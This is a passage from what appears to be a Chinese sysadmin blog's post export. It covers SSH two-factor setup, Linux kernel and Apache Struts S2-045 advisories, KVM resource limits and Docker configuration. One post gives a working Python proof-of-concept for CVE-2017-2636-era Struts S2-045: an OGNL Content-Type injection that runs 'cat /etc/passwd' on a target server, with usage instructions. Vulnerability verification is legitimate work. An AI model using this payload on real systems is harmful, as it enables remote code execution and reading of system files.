increasesyour chances to notice or even prevent man-in-the-middle attacks (y/n) 输入y回车 时间容错设置 意思是:默认情况下，密钥在30秒内有效，为了防止由于客户端与服务器时间偏移（时间相差太大）导致认证失败，google authenticator设计时间容错措施。 1234567891011121314 By default, tokens are good for 30 seconds. In order to compensate forpossible time-skew between the client and the server, we allow an extratoken before and after the current time. If you experience problems withpoor time synchronization, you can increase the window from its defaultsize of +-1min (window size of 3) to about +-4min (window size of17 acceptable tokens).Do you want to do so? (y/n) 这个可根据实际情况进行配置。 暴力破解防护 意思是：在你的电脑存在暴力破解的情况下可开启身份认证次数限制模块，默认限制为：30秒内不超过三次登陆尝试。 12345678 If the computer that you are logging into isn&apos;t hardened against brute-forcelogin attempts, you can enable rate-limiting for the authentication module.By default, this limits attackers to no more than 3 login attempts every 30s.Do you want to enable rate-limiting (y/n) 输入y回车 配置完成 配置完成后会在home目录下生成一个权限为400的隐藏文件，如下图所示： 配置运维密码 打开微信小程序 打开微信，依次点击发现，小程序 输入“运维密码”并搜索 点击“运维密码”进入应用 点击右下角二维码图标 扫一扫配置google-authenticator时所生成的二维码 点击确定添加场景 添加完成 配置SSH服务 添加认证模块 在/etc/pam.d/sshd文件添加认证模块 12echo &quot;auth required pam_google_authenticator.so&quot; &gt;&gt;/etc/pam.d/sshd 配置任何的密码认证 12sed -i &apos;s/ChallengeResponseAuthentication no/ChallengeResponseAuthentication yes/g&apos; /etc/ssh/sshd_config 重启sshd服务 12systemctl restart sshd.service 测试登陆以上配置完成基本上就搞定了，下面我们进行测试。 登陆测试 输入命令登陆主机 12ssh root@10.112.2.3 首先输入服务器的密码,接着会让输入运维密码。 运维密码可在小程序中查看。 如下图： 我们可以看到，在登陆的时候，需要配合“运维密码”才能登陆服务器。 公钥登陆测试 如果使用公钥登陆呢？以上配置是不是也是需要配合运维密码才能登陆的，我们进行验证： 首先，我们将本机的公钥复制到远程机器的authorized_keys文件中。 12ssh-copy-id root@10.112.2.3 登陆测试 我们可以看到，不需要输入任何密码，直接登陆到了系统。 结合运维密码配置增强型SSH安全选项针对上面公钥登陆的测试，如果还任我不是很安全，我们可以设定如下登陆场景：公钥+密码+运维密码，我们需要如何做呢？ 配置SSH公钥双因子 修改/etc/ssh/sshd_config配置文件 12echo &quot;AuthenticationMethods publickey,keyboard-interactive:pam&quot; &gt;&gt;/etc/ssh/sshd_config 重启SSH服务 12systemctl restart sshd.service 登陆测试 12ssh root@10.112.2.3 可以看到，登陆的时候是需要验证公钥，密码，及输入运维密码才能登陆到系统。 没有密钥的情况下尝试登陆测试,如下图 至此，本文结束，如有错误及不足欢迎指正。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"安全","slug":"技术文档/Tools/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/安全/"}],"tags":[{"name":"双因子认证","slug":"双因子认证","permalink":"http://blog.unixmen.cn/tags/双因子认证/"},{"name":"SSH安全加固","slug":"SSH安全加固","permalink":"http://blog.unixmen.cn/tags/SSH安全加固/"},{"name":"运维密码","slug":"运维密码","permalink":"http://blog.unixmen.cn/tags/运维密码/"}]},{"title":"潜伏7年的Linux内核漏洞CVE-2017-2636 ,可本地提权","slug":"潜伏7年的Linux内核漏洞CVE-2017-2636-可本地提权","date":"2017-03-20T02:00:55.000Z","updated":"2017-03-20T02:55:33.000Z","comments":true,"path":"2017/03/20/潜伏7年的Linux内核漏洞CVE-2017-2636-可本地提权/","link":"","permalink":"http://blog.unixmen.cn/2017/03/20/潜伏7年的Linux内核漏洞CVE-2017-2636-可本地提权/","excerpt":"","text":"漏洞描述又一个古老的Linux内核漏洞被曝光！ 漏洞编号：CVE-2017-2636漏洞发现者：Alexander Popov漏洞危害：高危，(CVSS v3标准漏洞,评分为7.8), 低权限用户利用该漏洞可以在Linux系统上实现本地提权。影响范围：这个bug最早引入在2009年6月22号。在该日期发布后的内核版本均可能受该漏洞影响。详情请参看https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=be10eb7589337e5defbe214dae038a53dd21add8 漏洞简述：该漏洞是Linux内核驱动 n_hdlc 模块(drivers/tty/n_hdlc.c)发生条件竞争导致的，。 Positive Technologies的研究员Alexander Popov发现了存在于N_HLDC linux内核驱动的竞争条件问题。这个内核驱动负责处理高级数据链路控制（High-Level Data Link Control或简称HDLC）数据。问题导致了double-free漏洞。利用该漏洞可以进行权限提升。该驱动模块提供HDLC串行线路规则，在大多Linux发行版的内核配置为CONFIG_N_HDLC = m，n_hdlc被编译成模块并启用。 Double Free其实就是同一个指针free两次。虽然一般把它叫做double free，其实只要是free一个指向堆内存的指针都有可能产生可以利用的漏洞。 “这是CVE-2017-2636的声明，该漏洞即N_HLDC (drivers/tty/n_hdlc.c) linux内核驱动中的竞争条件。这个漏洞可以用来进行本地提权。”SecList的安全公告提到。“该驱动提供HDLC串行线路规程，这是很多linux发行版中的内核模块——只要是内核设置中有CONFIG_N_HDLC=m的linux发行版。要利用这个漏洞不需要Microgate或者SyncLink硬件。当没有权限的用户打开伪终端并且调用TIOCSETD ioctl函数设置HDLC串行线路规程的时候，模块就会自动加载。” 因此未经授权的攻击者可以利用这个漏洞注入执行任意代码。 影响范围 这个漏洞影响的范围涵盖大多数主流的Linux发行版，包括Red Hat Enterprise Linux 6, 7, Fedora, SUSE, Debian和Ubuntu。 由于漏洞可以追溯至2009年7月，那些Linux设备存在漏洞长达7年了，但是根据Positive Technologies的调查，很难确定漏洞是否已经被利用过。 “漏洞非常老，所以在Linux工作站和服务器中传播广泛。”Popov说道，“要想利用漏洞，攻击者只需要没有权限的普通用户就行了。另外，攻击不需要任何特殊的硬件。” 研究人员在用syzkaller fuzzer进行系统调用测试的时候发现了这个漏洞。syzkaller fuzzer是由Google开发的代码安全审计软件。 Popov于是在2017年2月28日将漏洞细节、exp原型和补丁上报给了kernel.org。Popov称会在之后公布PoC。 修复建议 该漏洞目前已经修复，更新和漏洞详情均在3月7日公布。建议用户尽快下载安全更新。如果暂时无法安装更新，建议手动关闭n_hdlc模块。 Linux各发行版本对于该漏洞相关信息Red Hat Enterprise Linux/CentOShttps://access.redhat.com/security/cve/CVE-2017-2636 Debianhttps://security-tracker.debian.org/tracker/CVE-2017-2636 ubuntuhttps://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-2636.html SUSE/openSUSEhttps://www.suse.com/security/cve/CVE-2017-2636.html","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"struts2","slug":"struts2","permalink":"http://blog.unixmen.cn/tags/struts2/"}]},{"title":"KVM 实例资源限制","slug":"KVM实例资源限制","date":"2017-03-08T10:32:46.000Z","updated":"2017-03-08T10:35:56.000Z","comments":true,"path":"2017/03/08/KVM实例资源限制/","link":"","permalink":"http://blog.unixmen.cn/2017/03/08/KVM实例资源限制/","excerpt":"","text":"KVM生产环境一般情况下都是对KVM环境及内核等进行优化从而达到KVM实例发挥最优性能，但某些特定场景也会对实例进行资源限制。以下分享如何控制实例的资源使用，对实例使用资源进行控制。 一、磁盘资源的控制对磁盘的资源限制可使用blkiotune来实现。 使用blkiotune对磁盘进行限制有两种方式： 设置实例的权重 限制磁盘的IOPS 命令行格式：1blkiotune &lt;domain&gt; [--weight &lt;number&gt;] [--device-weights &lt;string&gt;] [--device-read-iops-sec &lt;string&gt;] [--device-write-iops-sec &lt;string&gt;] [--device-read-bytes-sec &lt;string&gt;] [--device-write-bytes-sec &lt;string&gt;] [--config] [--live] [--current] 参数如下：123456789--total-bytes-sec &lt;number&gt; total throughput limit in bytes per second--read-bytes-sec &lt;number&gt; read throughput limit in bytes per second--write-bytes-sec &lt;number&gt; write throughput limit in bytes per second--total-iops-sec &lt;number&gt; total I/O operations limit per second--read-iops-sec &lt;number&gt; read I/O operations limit per second--write-iops-sec &lt;number&gt; write I/O operations limit per second--config affect next boot--live affect running domain--current affect current domain 设置磁盘的权重磁盘的权重数值范围在100-1000。 示例：设置虚拟机的权重为700，并立即生效。1virsh blkiotune 25 --weight 700 --live 实例xml配置为：123&lt;blkiotune&gt;&lt;weight&gt;700&lt;/weight&gt;&lt;/blkiotune&gt; 限制磁盘IOPS使用blkdeviotune限制读写速度和IOPS 示例：限制读写（吞吐量）及IOPS1virsh blkdeviotune netb2c vda --read-bytes-sec 4096 --write-bytes-sec 2048 --read-iops-sec 15 --write-iops-sec 15 --live 实例xml配置为： 123456&lt;iotune&gt; &lt;read_bytes_sec&gt;4096&lt;/read_bytes_sec&gt; &lt;write_bytes_sec&gt;2048&lt;/write_bytes_sec&gt; &lt;read_iops_sec&gt;15&lt;/read_iops_sec&gt; &lt;write_iops_sec&gt;15&lt;/write_iops_sec&gt;&lt;/iotune&gt; 实测结果读写总和（读写速度、IOPS）与读写（读写速度、IOPS）同时只能设置一个 列举guest块设备列表 12virsh domblklist wpftestvda /home1/wpf/ubuntu-14-04-test.qcow2 设定guest读/写IOPS 1virsh blkdeviotune wpftest vda --read-iops-sec 300 --write-iops-sec 300 获取当前IOPS限制 1234567virsh blkdeviotune wpftest vdatotal_bytes_sec: 0read_bytes_sec : 0write_bytes_sec: 0total_iops_sec : 0read_iops_sec : 300write_iops_sec : 300 二、网卡的资源控制网卡的资源限制可在添加网卡是进行限制，以及对已有的网卡进行限制两种资源限制效果上没有区别，可按需选择。 添加网卡时对网卡带宽进行限制命令行格式为：1attach-interface &lt;domain&gt; &lt;type&gt; &lt;source&gt; [&lt;target&gt;] [&lt;mac&gt;] [&lt;script&gt;] [&lt;model&gt;] [--persistent] [&lt;inbound&gt;] [&lt;outbound&gt;] 命令行参数：12345678910[--domain] &lt;string&gt; domain name, id or uuid[--type] &lt;string&gt; network interface type[--source] &lt;string&gt; source of network interface[--target] &lt;string&gt; target network name[--mac] &lt;string&gt; MAC address[--script] &lt;string&gt; script used to bridge network interface[--model] &lt;string&gt; model type--persistent persist interface attachment[--inbound] &lt;string&gt; control domain&apos;s incoming traffics[--outbound] &lt;string&gt; control domain&apos;s outgoing traffics 对已有网卡进行带宽限制 命令格式为： 1domiftune &lt;domain&gt; &lt;interface&gt; [--inbound &lt;string&gt;] [--outbound &lt;string&gt;] [--config] [--live] [--current] 参数为： 1234567[--domain] &lt;string&gt; domain name, id or uuid[--interface] &lt;string&gt; interface device (MAC Address)--inbound &lt;string&gt; control domain&apos;s incoming traffics--outbound &lt;string&gt; control domain&apos;s outgoing traffics--config affect next boot--live affect running domain--current affect current domain 实例xml配置为 1234&lt;bandwidth&gt;&lt;inbound average=&apos;1000&apos; peak=&apos;50&apos; burst=&apos;64&apos;/&gt;&lt;outbound average=&apos;1000&apos; peak=&apos;50&apos; burst=&apos;64&apos;/&gt;&lt;/bandwidth&gt; 注：单位kilobytes 实测结果Libvirt实际也是使用TC，因为TC只能限制流出方向流量，不能限制流入方向，所以通过Libvirt限制流量，实际也只能限制流出方向。 列举guest网卡列表： 1234virsh domiflist netb2cInterface Type Source Model MAC-------------------------------------------------------vnet44 network default rtl8139 52:54:00:4a:61:6a 设定带宽限制 1virsh domiftune wpftest 52:54:00:3b:e2:a5 --inbound 1000 --outbound 1000 --live 查看当前网卡带宽限制 1234567virsh domiftune netb2c vnet44inbound.average: 1000inbound.peak : 0inbound.burst : 0outbound.average: 1000outbound.peak : 0outbound.burst : 0 注：资源限制过程中，–interface可以是MAC地址也可以是设备名字，生产环境最好使用MAC地址进行限制。 三、CPU资源的控制对于CPU的资源控制可对实例CPU的权重进行调整，优化可对vcpu与cpu物理核心进行绑定已提升性能及减少宿主机的CPU压力。 命令行格式：1schedinfo &lt;domain&gt; [--weight &lt;number&gt;] [--cap &lt;number&gt;] [--current] [--config] [--live] [[--set] &lt;string&gt;].. 参数：1234567[--domain] &lt;string&gt; domain name, id or uuid--weight &lt;number&gt; weight for XEN_CREDIT--cap &lt;number&gt; cap for XEN_CREDIT--current get/set current scheduler info--config get/set value to be used on next boot--live get/set value from running domain[--set] &lt;string&gt; parameter=value 实例xml配置为1234567891011121314&lt;domain&gt;&lt;cputune&gt;&lt;vcpupin vcpu=&quot;0&quot; cpuset=&quot;1-4,^2&quot;/&gt;&lt;vcpupin vcpu=&quot;1&quot; cpuset=&quot;0,1&quot;/&gt;&lt;vcpupin vcpu=&quot;2&quot; cpuset=&quot;2,3&quot;/&gt;&lt;vcpupin vcpu=&quot;3&quot; cpuset=&quot;0,4&quot;/&gt;&lt;emulatorpin cpuset=&quot;1-3&quot;/&gt;&lt;shares&gt;2048&lt;/shares&gt;&lt;period&gt;1000000&lt;/period&gt;&lt;quota&gt;-1&lt;/quota&gt;&lt;emulator_period&gt;1000000&lt;/emulator_period&gt;&lt;emulator_quota&gt;-1&lt;/emulator_quota&gt;&lt;/cputune&gt;&lt;/domain&gt; 主要参数说明：shares cpu权重，没有固定的数值，和其他的虚拟机相比较，那个的数值大，那个可以使用的cpu资源就多，比如设置2048值得虚拟机，就比设置1024数值的虚拟机可以多使用2倍的cpu资源。period vcpu强制间隔的时间周期，单位微秒，范围[1000, 1000000]，每一个vcpu不能使用超过period时间周期。quota vcpu最大允许带宽，单位微秒，范围[1000, 18446744073709551]emulator_period 强制间隔的时间周期，单位微妙，范围[1000, 1000000]，虚拟机进程(qemu)不能使用超过period时间周期。emulator_quota 虚拟机进程(qemu)最大允许带宽，单位微妙，范围[1000, 18446744073709551]。 实测结果对vcpu绑定有性能提升的效果，设置权重能控制CPU的资源利用。123virsh schedinfo --set cpu_shares=500 netb2cScheduler : posixcpu_shares : 500 四、内存资源的控制使用memtune可对实例使用内存资源进行控制 命令行格式为： 1memtune &lt;domain&gt; [--hard-limit &lt;number&gt;] [--soft-limit &lt;number&gt;] [--swap-hard-limit &lt;number&gt;] [--min-guarantee &lt;number&gt;] [--config] [--live] [--current] 命令行参数： 12345678[--domain] &lt;string&gt; domain name, id or uuid--hard-limit &lt;number&gt; Max memory, as scaled integer (default KiB)--soft-limit &lt;number&gt; Memory during contention, as scaled integer (default KiB)--swap-hard-limit &lt;number&gt; Max memory plus swap, as scaled integer (default KiB)--min-guarantee &lt;number&gt; Min guaranteed memory, as scaled integer (default KiB)--config affect next boot--live affect running domain--current affect current domain 实例xml配置为 12345678&lt;memory unit=&apos;KiB&apos;&gt;2097152&lt;/memory&gt;&lt;currentMemory unit=&apos;KiB&apos;&gt;2097152&lt;/currentMemory&gt;&lt;memtune&gt;&lt;hard_limit unit=&apos;KiB&apos;&gt;4194304&lt;/hard_limit&gt;&lt;soft_limit unit=&apos;KiB&apos;&gt;8388608&lt;/soft_limit&gt;&lt;min_guarantee unit=&apos;Kib&apos;&gt;1024000&lt;/min_guarantee&gt;&gt;&lt;swap_hard_limit unit=&apos;KiB&apos;&gt;4194304&lt;/swap_hard_limit&gt;&lt;/memtune&gt; 实测结果内存可以限制住，但一旦实例内存超限，会导致实例内存溢出从而宕机。 示例： 1virsh memtune netb2c --hard-limit 4194304 --soft-limit 8388608 --swap-hard-limit 4194304 --live --config 查看限制结果 1234virsh memtune netb2chard_limit : 4194304soft_limit : 8388608swap_hard_limit: 4194304","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"虚拟化","slug":"技术文档/Tools/虚拟化","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/虚拟化/"},{"name":"KVM","slug":"技术文档/Tools/虚拟化/KVM","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/虚拟化/KVM/"}],"tags":[{"name":"KVM","slug":"KVM","permalink":"http://blog.unixmen.cn/tags/KVM/"},{"name":"资源限制","slug":"资源限制","permalink":"http://blog.unixmen.cn/tags/资源限制/"},{"name":"性能优化","slug":"性能优化","permalink":"http://blog.unixmen.cn/tags/性能优化/"}]},{"title":"Struts-045 漏洞验证","slug":"Struts-045-漏洞验证","date":"2017-03-07T08:20:18.000Z","updated":"2017-03-08T01:18:35.000Z","comments":true,"path":"2017/03/07/Struts-045-漏洞验证/","link":"","permalink":"http://blog.unixmen.cn/2017/03/07/Struts-045-漏洞验证/","excerpt":"","text":"Struts-045-漏洞验证及漏洞修复后测试 接上篇注：本脚本仅为Struts-045漏洞验证及研究，严谨从事任何非法恶意操作。 一、脚本信息1234567891011121314151617181920#! /usr/bin/env python# encoding:utf-8import urllib2import sysfrom poster.encode import multipart_encodefrom poster.streaminghttp import register_openersdef poc(): register_openers() datagen, header = multipart_encode(&#123;&quot;image1&quot;: open(&quot;tmp.txt&quot;, &quot;rb&quot;)&#125;) header[&quot;User-Agent&quot;]=&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot; header[&quot;Content-Type&quot;]=&quot;%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;cat /etc/passwd&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot; request = urllib2.Request(str(sys.argv[1]),datagen,headers=header) response = urllib2.urlopen(request) print response.read()poc() 二、使用帮助 将脚本命名为st-045.py 在工作目录创建 image1 和 tmp.txt两个空文件 执行 python st-045.py URL如下图所示：三、漏洞修复后","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"struts2","slug":"struts2","permalink":"http://blog.unixmen.cn/tags/struts2/"}]},{"title":"关于Apache Struts2（S2-045）漏洞情况的通报","slug":"关于Apache-Struts2（S2-045）漏洞情况的通报","date":"2017-03-07T07:28:49.000Z","updated":"2017-03-07T07:52:55.000Z","comments":true,"path":"2017/03/07/关于Apache-Struts2（S2-045）漏洞情况的通报/","link":"","permalink":"http://blog.unixmen.cn/2017/03/07/关于Apache-Struts2（S2-045）漏洞情况的通报/","excerpt":"","text":"关于Apache Struts2 （S2-045）远程代码执行漏洞通报近日，国家信息安全漏洞库（CNNVD）收到关于Apache Struts2 （S2-045）远程代码执行漏洞（CNNVD-201703-152）的情况报送。由于该漏洞影响范围广，危害级别高，国家信息安全漏洞库（CNNVD）对此进行了跟踪分析，情况如下： 一、 漏洞简介Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级Java Web 应用的开源MVC框架，主要提供两个版本框架产品： Struts 1和Struts 2。 ApacheStruts 2.3.5 – 2.3.31版本及2.5 – 2.5.10版本存在远程代码执行漏洞（CNNVD-201703-152 ，CVE-2017-5638）。该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息。导致远程攻击者可通过发送恶意的数据包，利用该漏洞在受影响服务器上执行任意命令。 二、 漏洞危害攻击者可通过发送恶意构造的HTTP数据包利用该漏洞，在受影响服务器上执行系统命令，进一步可完全控制该服务器，造成拒绝服务、数据泄露、网站造篡改等影响。由于该漏洞利用无需任何前置条件（如开启dmi ，debug等功能）以及启用任何插件，因此漏洞危害较为严重。 三、 修复措施目前，Apache官方已针对该漏洞发布安全公告。请受影响用户及时检查是否受该漏洞影响。 自查方式 用户可查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar 文件，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。 升级修复 受影响用户可升级版本至Apache Struts 2.3.32 或 Apache Struts 2.5.10.1以消除漏洞影响。 临时缓解 如用户不方便升级，可采取如下临时解决方案： 删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。 相关链接官方Aapache Struts2（S2-045）安全公告","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"struts2","slug":"struts2","permalink":"http://blog.unixmen.cn/tags/struts2/"}]},{"title":"广告拦截APP\"AdClear\" for 安卓/iOS","slug":"广告拦截APPADclear-for-安卓-iOS","date":"2017-03-06T01:04:36.000Z","updated":"2017-03-06T06:54:33.000Z","comments":true,"path":"2017/03/06/广告拦截APPADclear-for-安卓-iOS/","link":"","permalink":"http://blog.unixmen.cn/2017/03/06/广告拦截APPADclear-for-安卓-iOS/","excerpt":"","text":"良心广告拦截APP分享：乐网AdClear，视频APP无需会员过滤广告 支持手机、平板 支持安卓、iOS 拦截系统内置广告 拦截视频软件广告 自身无广告 本地代理，建立VPN 无需root AppStore及安卓市场都可以搜到 从此观看视频一路畅通无阻。Enjoy it！","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"}],"tags":[{"name":"手机APP","slug":"手机APP","permalink":"http://blog.unixmen.cn/tags/手机APP/"},{"name":"工具","slug":"工具","permalink":"http://blog.unixmen.cn/tags/工具/"},{"name":"广告拦截","slug":"广告拦截","permalink":"http://blog.unixmen.cn/tags/广告拦截/"}]},{"title":"通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问","slug":"通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问","date":"2017-03-03T03:53:41.000Z","updated":"2017-03-06T06:52:44.000Z","comments":true,"path":"2017/03/03/通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问/","link":"","permalink":"http://blog.unixmen.cn/2017/03/03/通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问/","excerpt":"","text":"想用自己的域名发邮件，所以需要为域名开通个邮局业务，呵呵，就想到了免费邮局业务，现在提供免费企业邮局的厂家有很多，如腾讯、阿里、网易等，不过有个问题，就是免费邮局业务，现在都不支持绑定自己的域名进行访问登陆了，，，其实要想解决这个问题也非常的简单，只需要一个虚拟主机和一段PHP代码即可。 由于一直用腾讯微信、QQ，所以就用了腾讯免费企业邮局，通过搜索了解到景安提供的有免费虚拟主机，所以就选择他了，，，， 准备工作： 一个域名 已开通腾讯企业邮箱并设置正确解析 一个支持PHP的景安（免费）虚拟主机或者VPS 一、创建代码复制下面的代码，另存为index.php文件 1234&lt;?php $mail = file_get_contents(&quot;http://tel.exmail.qq.com/domain/mail.unixmen.cn&quot;); echo $mail;?&gt; 其中： unixmen.cn 为开通腾讯企业邮箱时所用域名(请改为自己的顶级域名) mail.unixmen.cn 为计划登陆访问时所用的域名 二、开通景安免费虚拟主机，绑定域名并解析 开通主机景安提供的有免费主机（下图左一）建议：如果使用收费的虚拟主机，只做登陆邮箱调转试用，选个便宜的，够用就行，我选了一个最低配置（下图右一）一年才49，土豪请随意。 考虑到虚拟主机还有其他用途，索性就买了个收费的业务。 注：无论是收费主机还是免费主机，以下操作或功能上没有区别。 添加域名绑定景安的虚拟主机如果不添加域名绑定，即便是解析正确，也无法访问，这个略屌。 添加解析 添加MX记录及添加CNAME解析到景安提供的三级域名。 解析生效 三、上传脚本程序使用FTP工具或者文件管理器将步骤一中创建的index.php文件上传到WEB文件夹中 四、测试访问如果上面的操作都没有错误的情况下，最后便可输入您的域名进行测试访问了，比如：mail.unixmen.cn 五、至此完成，可以使用自己的域名登陆企业邮箱了。如有问题欢迎吐槽打扰。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"}],"tags":[{"name":"其他","slug":"其他","permalink":"http://blog.unixmen.cn/tags/其他/"}]},{"title":"Docker 私有仓库无法上传镜像的问题","slug":"Docker-私有仓库无法上传镜像的问题","date":"2017-03-02T09:08:16.000Z","updated":"2017-03-29T00:41:20.000Z","comments":true,"path":"2017/03/02/Docker-私有仓库无法上传镜像的问题/","link":"","permalink":"http://blog.unixmen.cn/2017/03/02/Docker-私有仓库无法上传镜像的问题/","excerpt":"","text":"Docker 私有仓库启动后或者新节点配置私有仓库后，可能会出现无法push镜像到私有仓库，或无法pull镜像的问题如下图： 无法push镜像 无法pull镜像 导致原因：因为启动的registry服务不是安全可信赖的 解决方法如下： CentOS 6 修改docker的配置文件/etc/default/docker，添加下面的内容， 1DOCKER_OPTS=&quot;--insecure-registry xxx.xxx.xxx.xxx:5000&quot; 重启docker服务 1service docker restart CentOS 7 创建或修改 /etc/docker/daemon.json 文件，添加如下内容： 123&#123; &quot;insecure-registries&quot;: [&quot;xxx.xxx.xxx.xxx:5000&quot;] &#125; 重启Docker 服务 1systemctl restart docker 测试： push 测试 pull 测试","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"容器","slug":"技术文档/Tools/容器","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"},{"name":"Trouble shooting","slug":"Trouble-shooting","permalink":"http://blog.unixmen.cn/tags/Trouble-shooting/"}]},{"title":"Docker配置Daocloud加速器","slug":"Docker配置Daocloud加速器","date":"2017-03-02T07:12:31.000Z","updated":"2017-03-29T00:40:48.000Z","comments":true,"path":"2017/03/02/Docker配置Daocloud加速器/","link":"","permalink":"http://blog.unixmen.cn/2017/03/02/Docker配置Daocloud加速器/","excerpt":"","text":"Docker 版本在 1.12 或更高创建或修改 /etc/docker/daemon.json 文件，修改为如下形式 （请将 加速地址 替换为在加速器页面获取的专属地址）Daocloud加速器地址 123456&#123; &quot;registry-mirrors&quot;: [ &quot;加速地址&quot; ], &quot;insecure-registries&quot;: []&#125;","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"容器","slug":"技术文档/Tools/容器","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"},{"name":"容器配置","slug":"容器配置","permalink":"http://blog.unixmen.cn/tags/容器配置/"}]},{"title":"Docker配置HTTP代理","slug":"Docker配置HTTP代理","date":"2017-03-02T07:11:24.000Z","updated":"2017-03-29T00:42:18.000Z","comments":true,"path":"2017/03/02/Docker配置HTTP代理/","link":"","permalink":"http://blog.unixmen.cn/2017/03/02/Docker配置HTTP代理/","excerpt":"","text":"由于服务器处于内网，无法直接连接docker hub，需要配置代理使用，如图： CentOS 6下配置docker 的https_proxy 代理,只需要在/etc/sysconfig/docker 配置文件里面增加配置即可。 CentOS 7 无法使用这样的配置方式进行https_proxy 配置，原因为CentOS 7 使用systemd 来管理进程,我们需要添加https_proxy进行配置，步骤如下： 创建目录1mkdir /etc/systemd/system/docker.service.d 添加配置文件 12echo &quot;[Service]Environment=&quot;HTTP_PROXY=http://proxy.ip.com:80&quot;&quot;|tee /etc/systemd/system/docker.service.d/http-proxy.conf Reload systemd-daemon 12systemctl daemon-reload 重启docker服务 1systemctl restart docker 检查变量是否加载 1systemctl show docker --property Environment 